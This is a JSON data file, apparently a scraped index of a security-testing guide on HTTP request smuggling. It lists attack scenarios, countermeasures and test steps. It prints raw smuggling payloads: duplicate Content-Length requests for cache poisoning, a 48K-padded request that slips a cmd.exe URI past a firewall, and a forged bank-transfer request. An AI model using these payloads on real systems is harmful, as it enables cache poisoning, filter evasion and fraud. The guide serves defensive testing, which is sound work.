      "p",
      "p"
    ],
    "bank": [
      "p",
      "ol",
      "li"
    ],
    "account": [
      "p",
      "p",
      "ol",
      "li"
    ],
    "changing": [
      "p"
    ],
    "password": [
      "p"
    ],
    "without": [
      "p",
      "p",
      "ol",
      "li"
    ],
    "victim": [
      "p",
      "p"
    ],
    "noticing": [
      "p"
    ],
    "actually": [
      "p"
    ],
    "executes": [
      "p",
      "ol",
      "li"
    ],
    "csrf": [
      "p"
    ],
    "having": [
      "p"
    ],
    "interact": [
      "p"
    ],
    "current": [
      "p"
    ],
    "credentials": [
      "p",
      "p",
      "ol",
      "li"
    ],
    "known": [
      "p"
    ],
    "credential": [
      "p"
    ],
    "crafted": [
      "p",
      "ol",
      "li"
    ],
    "/some_scriptjsp": [
      "p",
      "font"
    ],
    "http/10connection:": [
      "p",
      "font"
    ],
    "keep-alivecontent-type": [
      "p",
      "font"
    ],
    "application/x-www-form-urlencodedcontent-length": [
      "p",
      "p",
      "font",
      "font",
      "p",
      "font"
    ],
    "9content-length": [
      "p",
      "font"
    ],
    "140this=thatget": [
      "p",
      "font"
    ],
    "/transferasp?to=attackers_account&ammount=10000": [
      "p",
      "font",
      "p",
      "font"
    ],
    "http/10content-type:": [
      "p",
      "font",
      "p",
      "font"
    ],
    "0foobar": [
      "p",
      "font",
      "p",
      "font"
    ],
    "goal": [
      "p"
    ],
    "different": [
      "p",
      "p",
      "ol",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "headers": [
      "p",
      "p",
      "p",
      "ol",
      "li",
      "ol",
      "li"
    ],
    "than": [
      "p",
      "p"
    ],
    "forwards": [
      "p",
      "ol",
      "li"
    ],
    "body’s": [
      "p"
    ],
    "length": [
      "p"
    ],
    "incomplete": [
      "p",
      "p"
    ],
    "smuggled)": [
      "p",
      "ol",
      "li"
    ],
    "concatenated": [
      "p"
    ],
    "http/10cookie:": [
      "p",
      "font",
      "p",
      "font"
    ],
    "session_id": [
      "p",
      "font",
      "p",
      "font"
    ],
    "=1234567890authorization": [
      "p",
      "font",
      "p",
      "font"
    ],
    "basic": [
      "p",
      "font",
      "p",
      "font"
    ],
    "dsfkoiqrgnksdf": [
      "p",
      "font",
      "p",
      "font"
    ],
    "calls": [
      "p"
    ],
    "transferasp": [
      "p",
      "i"
    ],
    "client’s": [
      "p"
    ],
    "victim).": [
      "p"
    ],
    "example": [
      "p"
    ],
    "attempts": [
      "p"
    ],
    "transfer": [
      "p"
    ],
    "$10000": [
      "p"
    ],
    "his": [
      "p"
    ],
    "next": [
      "p"
    ],
    "what": [
      "p"
    ],
    "them": [
      "p",
      "p"
    ],
    "defend": [
      "p"
    ],
    "against": [
      "p",
      "p"
    ],
    "happens": [
      "p"
    ],
    "entity/devices": [
      "p"
    ],
    "involve": [
      "p"
    ],
    "long": [
      "p",
      "ol",
      "li"
    ],
    "addition": [
      "p",
      "p",
      "p"
    ],
    "combinations": [
      "p"
    ],
    "conflicting": [
      "p"
    ],
    "transfer-encoding chunked": [
      "p"
    ],
    "fails": [
      "p"
    ],
    "final": [
      "p"
    ],
    "additional": [
      "p"
    ],
    "transfer-encoding": [
      "i",
      "ul",
      "li",
      "i"
    ],
    "protect": [
      "p"
    ],
    "you": [
      "p",
      "p",
      "p",
      "p"
    ],
    "must": [
      "p",
      "p"
    ],
    "fully": [
      "p"
    ],
    "patch": [
      "p",
      "p"
    ],
    "all": [
      "p",
      "p"
    ],
    "network": [
      "p",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "p",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "ol",
      "ol",
      "li",
      "li",
      "p"
    ],
    "devices": [
      "p"
    ],
    "services": [
      "p"
    ],
    "firewalls": [
      "p"
    ],
    "proxies": [
      "p"
    ],
    "whenever": [
      "p"
    ],
    "vendor": [
      "p"
    ],
    "discovers": [
      "p"
    ],
    "bug": [
      "p",
      "p"
    ],
    "releases": [
      "p"
    ],
    "easily": [
      "p"
    ],
    "downloaded": [
      "p"
    ],
    "installed": [
      "p"
    ],
    "might": [
      "p"
    ],
    "options": [
      "p"
    ],
    "strict": [
      "p"
    ],
    "mentioned": [
      "p"
    ],
    "affects": [
      "p"
    ],
    "apache": [
      "p",
      "p"
    ],
    "under": [
      "p",
      "ol",
      "li",
      "p"
    ],
    "configurations.": [
      "p"
    ],
    "thus": [
      "p"
    ],
    "important": [
      "p"
    ],
    "always": [
      "p"
    ],
    "run": [
      "p"
    ],
    "stricter": [
      "p"
    ],
    "configuration": [
      "p"
    ],
    "enclosed": [
      "p"
    ],
    "smuggled": [
      "p",
      "ol",
      "li"
    ],
    "detected": [
      "p"
    ],
    "familiar": [
      "p"
    ],
    "their": [
      "p"
    ],
    "focus": [
      "p"
    ],
    "detailing": [
      "p"
    ],
    "specific": [
      "p"
    ],
    "cases": [
      "p",
      "p"
    ],
    "requires": [
      "p",
      "p",
      "p"
    ],
    "four": [
      "p",
      "p"
    ],
    "hosts": [
      "p",
      "p",
      "p"
    ],
    "up": [
      "ol",
      "li",
      "ol",
      "li",
      "ol",
      "li"
    ],
    "sniffer": [
      "ol",
      "li",
      "ol",
      "li",
      "ol",
      "li"
    ],
    "monitoring": [
      "ol",
      "ol",
      "li",
      "li",
      "ol",
      "ol",
      "li",
      "li",
      "ol",
      "li"
    ],
    "traffic": [
      "ol",
      "ol",
      "li",
      "li",
      "ol",
      "ol",
      "li",
      "li",
      "ol",
      "li"
    ],
    "computer": [
      "ol",
      "ol",
      "li",
      "li",
      "ol",
      "ol",
      "li",
      "li",
      "ol",
      "ol",
      "li",
      "li"
    ],
    "send": [
      "ol",
      "ol",
      "li",
      "li",
      "ol",
      "ol",
      "li",
      "li",
      "ol",
      "li"
    ],
    "along": [
      "ol",
      "li"
    ],
    "poison": [
      "ol",
      "li",
      "p"
    ],
    "seen": [
      "ol",
      "li",
      "ol",
      "li",
      "ol",
      "li"
    ],
    "wait": [
      "ol",
      "li",
      "ol",
      "li",
      "ol",
      "li"
    ],
    "until": [
      "ol",
      "li",
      "ol",
      "li",
      "ol",
      "li"
    ],
    "replies": [
      "ol",
      "li",
      "ol",
      "li",
      "p"
    ],
    "original": [
      "ol",
      "li",
      "p",
      "ol",
      "li"
    ],
    "open": [
      "ol",
      "li"
    ],
    "browser": [
      "ol",
      "li"
    ],
    "navigate": [
      "ol",
      "li"
    ],
    "results": [
      "p",
      "p",
      "p"
    ],
    "should": [
      "p",
      "ol",
      "li",
      "ol",
      "ol",
      "li",
      "li",
      "p"
    ],
    "capture": [
      "p",
      "p",
      "p"
    ],
    "show": [
      "p"
    ],
    "replying": [
      "p"
    ],
    "contents": [
      "p"
    ],
    "poisoned": [
      "p"
    ],
    "make": [
      "ol",
      "li",
      "ol",
      "li",
      "p"
    ],
    "sure": [
      "ol",
      "li",
      "p"
    ],
    "out": [
      "ol",
      "li"
    ],
    "enabled": [
      "ol",
      "li"
    ],
    "try": [
      "ol",
      "li"
    ],
    "invoke": [
      "ol",
      "li"
    ],
    "uri": [
      "ol",
      "ol",
      "li",
      "li",
      "p",
      "p"
    ],
    "directly": [
      "ol",
      "li"
    ],
    "executing": [
      "ol",
      "li",
      "p"
    ],
    "attack.": [
      "ol",
      "li"
    ],
    "embedded": [
      "ol",
      "li",
      "p",
      "p",
      "ol",
      "li"
    ],
    "bodies": [
      "ol",
      "li"
    ],
    "shows": [
      "p",
      "p"
    ],
    "another": [
      "p"
    ],
    "valid": [
      "p",
      "ol",
      "li"
    ],
    "outcome": [
      "p"
    ],
    "denies": [
      "p"
    ],
    "log": [
      "ol",
      "li"
    ],
    "cookie": [
      "ol",
      "li"
    ],
    "and/or": [
      "ol",
      "li"
    ],
    "authentication": [
      "ol",
      "li"
    ],
    "desired": [
      "ol",
      "li"
    ],
    "makes": [
      "ol",
      "li"
    ],
    "transfers": [
      "ol",
      "li"
    ],
    "scenario.": [
      "ol",
      "li"
    ],
    "reply": [
      "ol",
      "li"
    ],
    "trigger": [
      "ol",
      "li"
    ],
    "correctly": [
      "p"
    ],
    "instead": [
      "p"
    ],
    "according": [
      "p"
    ],
    "methods": [
      "p"
    ],
    "depending": [
      "h2",
      "span",
      "p"
    ],
    "technique": [
      "h2",
      "span"
    ],
    "crucial": [
      "p"
    ],
    "techniques": [
      "p",
      "p"
    ],
    "tune": [
      "p"
    ],
    "your": [
      "p",
      "p"
    ],
    "accordingly": [
      "p"
    ],
    "below": [
      "p"
    ],
    "list": [
      "p"
    ],
    "presented": [
      "p"
    ],
    "double": [
      "ul",
      "ul",
      "li",
      "li"
    ],
    "combining": [
      "ul",
      "li"
    ],
    "chunked header": [
      "ul",
      "li"
    ],
    "cr": [
      "ul",
      "li"
    ],
    "backward": [
      "ul",
      "li"
    ],
    "smuggling.": [
      "ul",
      "li"
    ],
    "sp": [
      "ul",
      "li"
    ],
    "crfl": [
      "ul",
      "li"
    ],
    "trick": [
      "ul",
      "li"
    ],
    "k": [
      "ul",
      "li"
    ],
    "chunked": [
      "i"
    ],
    "effectiveness": [
      "p"
    ],
    "varies": [
      "p"
    ],
    "platform": [
      "p"
    ],
    "instance": [
      "p"
    ],
    "behave": [
      "p"
    ],
    "therefore": [
      "p"
    ],
    "tailored": [
      "p"
    ],
    "platform’s": [
      "p"
    ],
    "peculiarities": [
      "p"
    ],
    "conclusions": [
      "h1",
      "span"
    ],
    "apply": [
      "p",
      "p"
    ],
    "environments": [
      "p"
    ],
    "more": [
      "p"
    ],
    "firewall if": [
      "p"
    ],
    "lives": [
      "p"
    ],
    "environment": [
      "p"
    ],
    "necessary": [
      "p"
    ],
    "shown": [
      "p"
    ],
    "here": [
      "p"
    ],
    "verify": [
      "p"
    ],
    "equally": [
      "p"
    ],
    "incongruities": [
      "p"
    ],
    "may": [
      "p"
    ],
    "lead": [
      "p"
    ],
    "attackto": [
      "p"
    ],
    "well": [
      "p"
    ],
    "procedures": [
      "p"
    ]
  },
  "tags": {
    "h1": [
      "Applies To",
      "Summary",
      "Step 1: Understand Attack Scenarios",
      "Step 2: Analyze Causes and Countermeasures",
      "Step 3: Start Testing and Exploring",
      "Step 4: Fine-tune Test Case Data",
      "Conclusions"
    ],
    "span": [
      "Applies To",
      "Summary",
      "Step 1: Understand Attack Scenarios",
      "",
      "Web cache poisoning",
      "Firewall/IDS/IPS bypass",
      "Cross-site request forgery",
      "Step 2: Analyze Causes and Countermeasures",
      "HTTP Request Smuggling Causes",
      "HTTP Request Smuggling Countermeasures",
      "Step 3: Start Testing and Exploring",
      "",
      "Testing for Web Cache Poisoning through HTTP Request Smuggling",
      "Testing for Firewall Bypass through HTTP Request Smuggling",
      "",
      "Testing for Cross-Site Request Forgery through HTTP Request Smuggling",
      "Step 4: Fine-tune Test Case Data",
      "Fine-tune test case data depending on HRS technique",
      "Conclusions",
      ""
    ],
    "ul": [
      "Applications using the HTTP protocol",
      "Step 1: Understand attack scenarios\n    Step 2: Analyze causes and countermeasures\n    Step 3: Start testing and exploring\n    Step 4: Fine-tune test case data",
      "Web cache poisoning\n    Firewall/IDS/IPS bypass\n    Cross-site request forgery",
      "Double Content-Length header.\n    Combining Transfer-Encoding: chunked header and a Content-Length header.\n    Double CR.\n    GET Request with Content-Length (backward smuggling).\n    CRLF SP CRFL trick.\n    Sending a request with body > 48 K."
    ],
    "li": [
      "Applications using the HTTP protocol",
      "Step 1: Understand attack scenarios",
      "Step 2: Analyze causes and countermeasures",
      "Step 3: Start testing and exploring",
      "Step 4: Fine-tune test case data",
      "Web cache poisoning",
      "Firewall/IDS/IPS bypass",
      "Cross-site request forgery",
      "Set up a network sniffer in the web cache server and start monitoring network traffic.",
      "From the attacker computer, send a request to the web server through the cache server. Send a POST with two Content-Length headers along with a target page and a poison page as seen in the first scenario.",
      "Wait until the web server replies to the original request.",
      "From the client computer, open a web browser and navigate to the target page.",
      "Stop monitoring network traffic in the web cache server.",
      "Set up a network sniffer in the firewall server and start monitoring network traffic.",
      "In the firewall server, make sure that rules to filter out dangerous URIs are enabled.",
      "In the client computer, try to invoke a dangerous URI directly by using a GET request (without executing an attack). The firewall should block this.",
      "From the attacker computer, send a request to the web server through the firewall server. Send a POST that has an embedded GET to the dangerous URI using different Content-Length headers or long bodies, as seen in the second scenario.",
      "Wait until the web server processes the request.",
      "Stop monitoring network traffic in the firewall server.",
      "Set up a network sniffer in the proxy server and start monitoring network traffic.",
      "In the client, log in to the web application under test to get a valid cookie and/or authentication credentials.",
      "From the attacker computer, send a crafted request to the web server through the proxy with two Content-Length and an embedded request to a page that executes the desired action (such as a page that makes bank account transfers, as seen in the third scenario).",
      "Wait until the proxy forwards the request to the web server and the web server replies. The web server should only reply to the original request and not to the smuggled one.",
      "In the client computer, make any request to the web server. This should trigger the second (smuggled) request to be parsed by the web server.",
      "Double Content-Length header.",
      "Combining Transfer-Encoding: chunked header and a Content-Length header.",
      "Double CR.",
      "GET Request with Content-Length (backward smuggling).",
      "CRLF SP CRFL trick.",
      "Sending a request with body > 48 K."
    ],
    "p": [
      "HTTP request smuggling (HRS) bugs allow attackers to smuggle an HTTP request through a vulnerable HTTP entity or device, such as a web cache server or an application firewall. This vulnerability exists because of discrepancies between how two entities parse an HTTP request. As a result, an attacker can smuggle an HTTP request that goes undetected by one of the vulnerable entities, such as a proxy or a firewall. Attackers commonly use HTTP request vulnerabilities to bypass firewall rules or to execute other attacks such as cross-site scripting (XSS), web cache poisoning, and session hijacking.",
      "Follow these steps in order to test for HTTP request smuggling:",
      "The first step in testing for HTTP request smuggling vulnerabilities is to understand how they are exploited. The following are common HRS attack scenarios:",
      "The first HRS vulnerability, web cache poisoning, was reported by engineers at Watchfire Corporation (now IBM) in 2005. The vulnerability is possible because SunONE Web Server 6.1 and SunONE Proxy 3.6 interpret the Content-Length header differently. The HRS attack consists of sending the following HTTP POST request to the W/S through the proxy:",
      "1 POST http://vulnerable_site/example.html HTTP/1.12 Host: vulnerable_site3 Connection: Keep-Alive4 Content-Type: application/x-www-form-urlencoded5 Content-Length: 06 Content-Length: 527 [CRLF]8 GET /poison.html HTTP/1.19 Host: vulnerable_site10 Poisoned!!! [space after the \"Poisoned!!!\", but no CRLF]11 GET http://vulnerable_site/target_page.html HTTP/1.112 Host: vulnerable_site13 Connection: Keep-Alive14 [CRLF]",
      "Note that each line ends with a Carriage Return/Line Feed (CRLF), except line 10. The proxy ignores the first Content-Length and uses the second one (52), so it parses the first GET as part of the POST request (lines 1 to 10). Then it parses a second GET request (line 11 to 14) and sends it to the W/S. In turn, the W/S uses the first Content-Length (0) and assumes that the POST request has no body (lines 1 to 7). Then, since there is no CRLF in line 10, it parses the remaining data as a single GET request (lines 8 to 14):",
      "1 POST http://vulnerable_site/example.html HTTP/1.12 Host: vulnerable_site3 Connection: Keep-Alive4 Content-Type: application/x-www-form-urlencoded5 Content-Length: 06 Content-Length: 527 [CRLF]8 GET /poison.html HTTP/1.19 Host: vulnerable_site10 Poisoned!!! [space after the \"Poisoned!!!\", but no CRLF]11 GET http://vulnerable_site/target_page.html HTTP/1.112 Host: vulnerable_site13 Connection: Keep-Alive14 [CRLF]",
      "When forwarding the two requests, the proxy will receive two responses from the web server. Assuming that poison.html is cacheable, the proxy will associate the second request to target_page.htm with the response to poison.html, leading to a cache poisoning attack when a client requests the target page.",
      "The second scenario relates to bypassing firewall protection, specifically application layer content-based filters such as filters that block any dangerous URIs (such as potential worm filenames like cmd.exe or directory traversal strings like \"../../\"). Watchfire reported a vulnerability that affected IIS 5.0 and could be used to exploit CheckPoint FW-1. It happened due to IIS 5.0 truncating POST requests of certain page extensions in which the body exceeds 48K if the Content-Type header is not set to the expected value (such as application/x-www-form-urlencoded for .asp pages):",
      "1 POST /any.asp HTTP/1.12 Host: vulnerable_site3 Connection: Keep-Alive4 Content-Length: 492235 [CRLF]6 AAAA... [\"A\" x 49152 (48K)]7 POST /any.asp HTTP/1.08 Connection: Keep-Alive9 Content-Length: 3010 [CRLF]11 POST /any.asp HTTP/1.012 Bla: [space after the \"Bla:\", but no CRLF]13 POST /any.asp?cmd.exe HTTP/1.014 Connection: Keep-Alive15 [CRLF]",
      "CheckPoint properly parses the first POST from line 1 to 10 as dictated by the Content-Length header. It doesn’t stop parsing the first request after the sequence of “A”s because it doesn’t suffer from the truncation issue. However, IIS 5.0 truncated the first request in line 6, parsed a second one of Content-Length 30 from line 7 to 12, and finally parses a third and malicious one from lines 13 to 15:",
      "1 POST /any.asp HTTP/1.12 Host: vulnerable_site3 Connection: Keep-Alive4 Content-Length: 492235 [CRLF]6 AAAA... [\"A\" x 49152 (48K)]7 POST /any.asp HTTP/1.08 Connection: Keep-Alive9 Content-Length: 3010 [CRLF]11 POST /any.asp HTTP/1.012 Bla: [space after the \"Bla:\", but no CRLF]13 POST /any.asp?cmd.exe HTTP/1.014 Connection: Keep-Alive15 [CRLF]",
      "IIS interprets and processes three requests while CheckPoint interprets only two (and doesn’t see the last one). This discrepancy on parsing the above data leads to attackers being able to bypass the firewall filter via HRS.",
      "HTTP request smuggling also enables Cross-site Request Forgery (CSRF) attacks. Using this vulnerability, an attacker is able to forge a fake request and execute a malicious action such as transferring money from a victim’s bank account or changing the victim’s password without the victim noticing. Actually, using request smuggling, the attacker executes CSRF attacks without having to interact with the victim. Since it uses the victim’s current credentials, the attack is also known as Request Credential Hijacking.",
      "The attack consists of sending a crafted attack request to a web server through a proxy:",
      "POST /some_script.jsp HTTP/1.0Connection: Keep-AliveContent-Type: application/x-www-form-urlencodedContent-Length: 9Content-Length: 140this=thatGET /transfer.asp?to=attackers_account&ammount=10000 HTTP/1.0Content-Type: application/x-www-form-urlencodedContent-Length: 0Foobar:",
      "The goal is to use two different Content-Length headers so that the proxy processes the above request differently than the web server. The proxy parses the data as single POST request and forwards it to the web server. The web server parses it as a POST request with body’s length 9 and an incomplete GET request. Then, if a client sends a request, the web server processes the incomplete GET request (smuggled) concatenated with the client request.",
      "If the client then sends:",
      "GET /any.asp HTTP/1.0Cookie: session_id =1234567890Authorization: Basic dsfkoiqrgnksdf",
      "The web server processes the following request:",
      "GET /transfer.asp?to=attackers_account&ammount=10000 HTTP/1.0Content-Type: application/x-www-form-urlencodedContent-Length: 0Foobar: GET /any.asp HTTP/1.0Cookie: session_id =1234567890Authorization: Basic dsfkoiqrgnksdf",
      "As a result, the vulnerable web server calls transfer.asp using the client’s credentials (victim). In the example above, the attacker attempts to transfer $10,000 to his account.",
      "The next step in testing for HTTP request smuggling vulnerabilities is to analyze what causes them and how to defend against them.",
      "HTTP request smuggling happens because two HTTP entity/devices parse HTTP requests differently. The scenarios above involve using two Content-Length headers or a long request. In addition, attackers can use other combinations of conflicting headers such as Transfer-Encoding: chunked with a Content-Length header. If an HTTP device such as a firewall fails to parse an HTTP request as the final device, an attacker can smuggle an additional request through it and execute this attack.",
      "To protect against HTTP request smuggling, you must fully patch all network devices such as web services, firewalls, and proxies. Whenever a vendor discovers an HTTP request smuggling bug, it releases a patch that can be easily downloaded and installed. In addition, there might be options for strict parsing (Watchfire mentioned a vulnerability that only affects Apache under certain configurations). Thus, it is important to always run with the stricter configuration so that any enclosed or smuggled requests are detected.",
      "Now that you are familiar with HTTP request smuggling attack scenarios and understand their causes and countermeasures, this step will focus on detailing specific test cases for each of the different request smuggling scenarios.",
      "",
      "This test requires four hosts: an attacker, a client, a web server, and a web cache server. Follow these steps:",
      "Expected results: The client should receive the original target page and not the poison page in step 4. In addition, the network capture must not show the web server replying with the contents of the poisoned page.",
      "This test requires three hosts: an attacker, a web server, and a firewall server. Follow these steps:",
      "Expected results: The capture shows that the web server doesn’t parse the embedded GET with the malicious URI. Another possible valid outcome is that the firewall parses the embedded GET and denies the malicious URI.",
      "This test requires four hosts: an attacker, a client, a web server, and a proxy server. Follow these steps:",
      "Expected results: The capture shows that the web server replies correctly to the client request in step 5 instead of executing the malicious action.",
      "The last step in testing for HTTP request smuggling vulnerabilities is to fine-tune test case data according to the different attack methods.",
      "It is crucial that you understand the different HRS techniques so that you can tune your data accordingly. Below is a list of the different techniques presented by Watchfire:",
      "Note that the effectiveness of each of these attacks varies depending on the platform under test. For instance, Apache will behave different than IIS; therefore test case data should be tailored to each platform’s peculiarities.",
      "HTTP request smuggling vulnerabilities apply to web environments with two or more web entities such as a web server with a proxy or a web server with a firewall. If your application lives in this environment, it is necessary to execute the test cases shown here in order to verify that all entities in the network equally parse HTTP requests. Any incongruities in parsing may lead to a request smuggling attack.To properly test for this bug, make sure to understand the attack scenarios, causes and countermeasures, as well as to apply the different testing procedures."
    ],
    "b": [
      ""
    ],
    "i": [
      "",
      "Content-Length",
      "[CRLF]",
      "[space after the \"Poisoned!!!\", but no CRLF]",
      "[CRLF]",
      "Content-Length",
      "[CRLF]",
      "[space after the \"Poisoned!!!\", but no CRLF]",
      "[CRLF]",
      "poison.html",
      "target_page.htm",
      "poison.html",
      "Content-Type",
      "application/x-www-form-urlencoded",
      "[CRLF]",
      "[\"A\" x 49152 (48K)]",
      "[CRLF]",
      "[space after the \"Bla:\", but no CRLF]",
      "[CRLF]",
      "Content-Length",
      "A",
      "Content-Length",
      "[CRLF]",
      "[\"A\" x 49152 (48K)]",
      "[CRLF]",
      "[space after the \"Bla:\", but no CRLF]",
      "[CRLF]",
      "Content-Length",
      "transfer.asp",
      "Content-Length",
      "Transfer-Encoding:",
      "Content-Length",
      "Content-Length",
      "Content-Length",
      "Content-Length",
      "Watchfire",
      "Content-Length",
      "Transfer-Encoding: chunked",
      "Content-Length",
      "Content-Length"
    ],
    "h2": [
      "Web cache poisoning",
      "Firewall/IDS/IPS bypass",
      "Cross-site request forgery",
      "HTTP Request Smuggling Causes",
      "HTTP Request Smuggling Countermeasures",
      "Testing for Web Cache Poisoning through HTTP Request Smuggling",
      "Testing for Firewall Bypass through HTTP Request Smuggling",
      "Testing for Cross-Site Request Forgery through HTTP Request Smuggling",
      "Fine-tune test case data depending on HRS technique"
    ],
    "font": [
      "1 POST http://vulnerable_site/example.html HTTP/1.12 Host: vulnerable_site3 Connection: Keep-Alive4 Content-Type: application/x-www-form-urlencoded5 Content-Length: 06 Content-Length: 527 [CRLF]8 GET /poison.html HTTP/1.19 Host: vulnerable_site10 Poisoned!!! [space after the \"Poisoned!!!\", but no CRLF]11 GET http://vulnerable_site/target_page.html HTTP/1.112 Host: vulnerable_site13 Connection: Keep-Alive14 [CRLF]",
      "1 POST http://vulnerable_site/example.html HTTP/1.12 Host: vulnerable_site3 Connection: Keep-Alive4 Content-Type: application/x-www-form-urlencoded5 Content-Length: 06 Content-Length: 527 [CRLF]8 GET /poison.html HTTP/1.19 Host: vulnerable_site10 Poisoned!!! [space after the \"Poisoned!!!\", but no CRLF]11 GET http://vulnerable_site/target_page.html HTTP/1.112 Host: vulnerable_site13 Connection: Keep-Alive14 [CRLF]",
      "1 POST /any.asp HTTP/1.12 Host: vulnerable_site3 Connection: Keep-Alive4 Content-Length: 492235 [CRLF]6 AAAA... [\"A\" x 49152 (48K)]7 POST /any.asp HTTP/1.08 Connection: Keep-Alive9 Content-Length: 3010 [CRLF]11 POST /any.asp HTTP/1.012 Bla: [space after the \"Bla:\", but no CRLF]13 POST /any.asp?cmd.exe HTTP/1.014 Connection: Keep-Alive15 [CRLF]",
      "1 POST /any.asp HTTP/1.12 Host: vulnerable_site3 Connection: Keep-Alive4 Content-Length: 492235 [CRLF]6 AAAA... [\"A\" x 49152 (48K)]7 POST /any.asp HTTP/1.08 Connection: Keep-Alive9 Content-Length: 3010 [CRLF]11 POST /any.asp HTTP/1.012 Bla: [space after the \"Bla:\", but no CRLF]13 POST /any.asp?cmd.exe HTTP/1.014 Connection: Keep-Alive15 [CRLF]",
      "POST /some_script.jsp HTTP/1.0Connection: Keep-AliveContent-Type: application/x-www-form-urlencodedContent-Length: 9Content-Length: 140this=thatGET /transfer.asp?to=attackers_account&ammount=10000 HTTP/1.0Content-Type: application/x-www-form-urlencodedContent-Length: 0Foobar:",
      "GET /any.asp HTTP/1.0Cookie: session_id =1234567890Authorization: Basic dsfkoiqrgnksdf",
      "GET /transfer.asp?to=attackers_account&ammount=10000 HTTP/1.0Content-Type: application/x-www-form-urlencodedContent-Length: 0Foobar: GET /any.asp HTTP/1.0Cookie: session_id =1234567890Authorization: Basic dsfkoiqrgnksdf"
    ],
    "br": [
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      ""
    ],
    "ol": [
      "Set up a network sniffer in the web cache server and start monitoring network traffic.\n    From the attacker computer, send a request to the web server through the cache server. Send a POST with two Content-Length headers along with a target page and a poison page as seen in the first scenario.\n    Wait until the web server replies to the original request.\n    From the client computer, open a web browser and navigate to the target page.\n    Stop monitoring network traffic in the web cache server.",
      "Set up a network sniffer in the firewall server and start monitoring network traffic.\n    In the firewall server, make sure that rules to filter out dangerous URIs are enabled. \n    In the client computer, try to invoke a dangerous URI directly by using a GET request (without executing an attack). The firewall should block this.\n    From the attacker computer, send a request to the web server through the firewall server. Send a POST that has an embedded GET to the dangerous URI using different Content-Length headers or long bodies, as seen in the second scenario.\n    Wait until the web server processes the request.\n    Stop monitoring network traffic in the firewall server.",
      "Set up a network sniffer in the proxy server and start monitoring network traffic.\n    In the client, log in to the web application under test to get a valid cookie and/or authentication credentials.\n    From the attacker computer, send a crafted request to the web server through the proxy with two Content-Length and an embedded request to a page that executes the desired action (such as a page that makes bank account transfers, as seen in the third scenario).\n    Wait until the proxy forwards the request to the web server and the web server replies. The web server should only reply to the original request and not to the smuggled one.\n    In the client computer, make any request to the web server. This should trigger the second (smuggled) request to be parsed by the web server."
    ]
  },
  "links": [],
  "html": "<h1>\n    <span>Applies To</span>\n  </h1>\n  <ul>\n    <li>Applications using the HTTP protocol&nbsp;</li>\n  </ul>\n  <h1>\n    <span>Summary</span>\n  </h1>\n  <p>HTTP request smuggling (HRS) bugs allow attackers to smuggle an HTTP request through a vulnerable HTTP entity or device, such as a web cache server or an application firewall. This vulnerability exists because of discrepancies between how two entities parse an HTTP request. As a result, an attacker can smuggle an HTTP request that goes undetected by one of the vulnerable entities, such as a proxy or a firewall. Attackers commonly use HTTP request vulnerabilities to bypass firewall rules or to execute other attacks such as cross-site scripting (XSS), web cache poisoning, and session hijacking. </p>\n  <p>Follow these steps in order to test for HTTP request smuggling:</p>\n  <ul>\n    <li>Step 1: Understand attack scenarios</li>\n    <li>Step 2: Analyze causes and countermeasures</li>\n    <li>Step 3: Start testing and exploring</li>\n    <li>Step 4: Fine-tune test case data&nbsp;</li>\n  </ul>\n  <h1>\n    <span>Step 1: Understand Attack Scenarios</span>\n  </h1>\n  <p>The first step in testing for HTTP request smuggling vulnerabilities is to understand how they are exploited. The following are common HRS attack scenarios:</p>\n  <ul>\n    <li>Web cache poisoning</li>\n    <li>Firewall/IDS/IPS bypass</li>\n    <li>Cross-site request forgery<b><i><span>&nbsp;</span></i></b></li>\n  </ul>\n  <h2>\n    <span>\n      Web cache poisoning\n    </span>\n  </h2>\n  <p>The first HRS vulnerability, web cache poisoning, was reported by engineers at Watchfire Corporation (now IBM) in 2005. The vulnerability is possible because SunONE Web Server 6.1 and SunONE Proxy 3.6 interpret the <i>Content-Length</i> header differently. The HRS attack consists of sending the following HTTP POST request to the W/S through the proxy:</p>\n  <p>\n    <font face=\"'Courier New'\">1 POST&nbsp;http://vulnerable_site/example.html&nbsp;HTTP/1.1<br />2 Host: vulnerable_site<br />3 Connection: Keep-Alive<br />4 Content-Type: application/x-www-form-urlencoded<br />5 Content-Length: 0<br />6 Content-Length: 52<br />7 <i>[CRLF]</i><br />8 GET /poison.html HTTP/1.1<br />9 Host: vulnerable_site<br />10 Poisoned!!!&nbsp;<i>[space after the \"Poisoned!!!\", but no CRLF]</i><br />11 GET http://vulnerable_site/target_page.html HTTP/1.1<br />12 Host: vulnerable_site<br />13 Connection: Keep-Alive<br />14 <i>[CRLF]</i></font>\n  </p>\n  <p>Note that each line ends with a Carriage Return/Line Feed (CRLF), except line 10. The proxy ignores the first <i>Content-Length</i> and uses the second one (52), so it parses the first GET as part of the POST request (lines 1 to 10). Then it parses a second GET request (line 11 to 14) and sends it to the W/S. In turn, the W/S uses the first Content-Length (0) and assumes that the POST request has no body (lines 1 to 7). Then, since there is no CRLF in line 10, it parses the remaining data as a single GET request (lines 8 to 14):</p>\n  <p>\n    <font face=\"'Courier New'\">1 POST&nbsp;http://vulnerable_site/example.html&nbsp;HTTP/1.1<br />2 Host: vulnerable_site<br />3 Connection: Keep-Alive<br />4 Content-Type: application/x-www-form-urlencoded<br />5 Content-Length: 0<br />6 Content-Length: 52<br />7 <i>[CRLF]</i><br />8 GET /poison.html HTTP/1.1<br />9 Host: vulnerable_site<br />10 Poisoned!!!&nbsp;<i>[space after the \"Poisoned!!!\", but no CRLF]</i><br />11 GET http://vulnerable_site/target_page.html HTTP/1.1<br />12 Host: vulnerable_site<br />13 Connection: Keep-Alive<br />14 <i>[CRLF]</i></font>\n  </p>\n  <p>When forwarding the two requests, the proxy will receive two responses from the web server. Assuming that <i>poison.html</i> is cacheable, the proxy will associate the second request to <i>target_page.htm</i> with the response to <i>poison.html</i>, leading to a cache poisoning attack when a client requests the target page.</p>\n  <h2>\n    <span>\n      Firewall/IDS/IPS bypass\n    </span>\n  </h2>\n  <p>The second scenario relates to bypassing firewall 